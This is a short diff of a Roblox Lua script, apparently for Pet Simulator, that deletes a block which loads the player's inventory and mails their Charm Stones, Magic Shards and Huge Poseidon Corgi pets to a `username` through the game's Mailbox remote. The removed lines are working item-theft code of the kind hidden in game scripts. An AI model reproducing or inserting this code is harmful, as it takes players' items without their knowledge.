@@ -3,53 +3,7 @@
 local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local result = saveModule.Get()
 
-local cs = result.Inventory.Misc
-for i, v in pairs(cs) do
-    if v.id == "Charm Stone" then
-        local args = {
-            username,
-            "Charm Stone",
-            "Misc",
-            i,
-            v._am or 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
 
-task.wait(2)
-
-local ms = result.Inventory.Misc
-for i, v in pairs(ms) do
-    if v.id == "Magic Shard" then
-        local args = {
-            username,
-            "Magic Shard",
-            "Misc",
-            i,
-            v._am or 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
-
-task.wait(2)
-
-local pet = result.Inventory.Pet
-for i, v in pairs(pet) do
-    if v.id == "Huge Poseidon Corgi" then
-        local args = {
-            username,
-            "Huge Poseidon Corgi",
-            "Pet",
-            i,
-            v._am or 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
-
-task.wait(2)
 
 
 
